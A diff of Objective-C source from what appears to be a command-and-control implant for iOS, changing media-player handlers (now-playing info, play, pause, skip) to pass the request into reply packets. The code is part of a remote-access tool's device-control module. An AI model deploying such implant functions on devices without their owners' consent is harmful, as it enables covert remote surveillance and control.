@@ -84,7 +84,7 @@ static tlv_pkt_t *player_info(c2_t *c2)
     char *album;
     char *artist;
 
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
     song = [[MPMusicPlayerController systemMusicPlayer] nowPlayingItem];
 
     title = (char *)[[song valueForProperty:MPMediaItemPropertyTitle] UTF8String];
@@ -112,25 +112,25 @@ static tlv_pkt_t *player_info(c2_t *c2)
 static tlv_pkt_t *player_play(c2_t *c2)
 {
     MRMediaRemoteSendCommand(kMRPlay, nil);
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
 static tlv_pkt_t *player_pause(c2_t *c2)
 {
     MRMediaRemoteSendCommand(kMRPause, nil);
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
 static tlv_pkt_t *player_next(c2_t *c2)
 {
     MRMediaRemoteSendCommand(kMRNextTrack, nil);
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
 static tlv_pkt_t *player_back(c2_t *c2)
 {
     MRMediaRemoteSendCommand(kMRPreviousTrack, nil);
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
 static int player_wave_create(pipe_t *pipe, c2_t *c2)
